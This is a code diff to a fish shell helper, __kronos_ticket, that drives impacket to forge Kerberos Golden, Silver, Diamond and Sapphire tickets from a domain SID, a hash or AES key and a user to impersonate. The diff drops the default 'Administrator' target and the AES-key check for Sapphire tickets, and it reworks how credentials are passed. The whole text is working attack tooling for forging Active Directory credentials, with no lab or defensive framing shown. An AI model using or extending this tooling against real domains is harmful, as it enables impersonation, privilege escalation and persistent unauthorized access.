@@ -90,7 +90,6 @@ function __kronos_ticket --description "Create Golden, Silver, Diamond, and Sapp
 
         # 5. User to impersonate
         set -l def_user "$__KRONOS_CACHE_USER"
-        if test -z "$def_user"; set def_user "Administrator"; end
         if test -n "$user"; set def_user "$user"; end
         set user (__kronos_ask "User to impersonate" "$def_user"); or return 1
         set -U __KRONOS_CACHE_USER "$user"
@@ -152,7 +151,6 @@ function __kronos_ticket --description "Create Golden, Silver, Diamond, and Sapp
     if test -z "$domain"; echo "error: domain is required"; return 1; end
     if test -z "$sid"; echo "error: domain SID is required"; return 1; end
     if test -z "$hash"; echo "error: hash is required"; return 1; end
-    if test "$subaction" = "sapphire" -a -z "$aes_key"; echo "error: AES Key is required for sapphire tickets"; return 1; end
     if test "$subaction" = "silver" -a -z "$spn"; echo "error: SPN is required for silver tickets"; return 1; end
     if test "$subaction" = "diamond" -o "$subaction" = "sapphire"
         if test -z "$auth_user"; echo "error: auth-user is required"; return 1; end
@@ -172,13 +170,19 @@ function __kronos_ticket --description "Create Golden, Silver, Diamond, and Sapp
             echo "[*] Forging Silver Ticket for $user via $impacket_cmd..."
         case diamond
             set -a ticket_args -request -user "$auth_user" -user-id "$user_id" -groups "$groups"
-            if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash"
-            else; set -a ticket_args -password "$auth_pass"; end
+            if test -n "$auth_hash"
+                set -a ticket_args -hashes "$auth_hash" -password ""
+            else
+                set -a ticket_args -password "$auth_pass"
+            end
             echo "[*] Forging Diamond Ticket for $user via $impacket_cmd..."
         case sapphire
             set -a ticket_args -request -user "$auth_user" -aesKey "$aes_key" -user-id "$user_id" -impersonate "$user"
-            if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash"
-            else; set -a ticket_args -password "$auth_pass"; end
+            if test -n "$auth_hash"
+                set -a ticket_args -hashes "$auth_hash" -password ""
+            else
+                set -a ticket_args -password "$auth_pass"
+            end
             echo "[*] Forging Sapphire Ticket for $user via $impacket_cmd..."
         case golden '*'
             echo "[*] Forging Golden Ticket for $user via $impacket_cmd..."
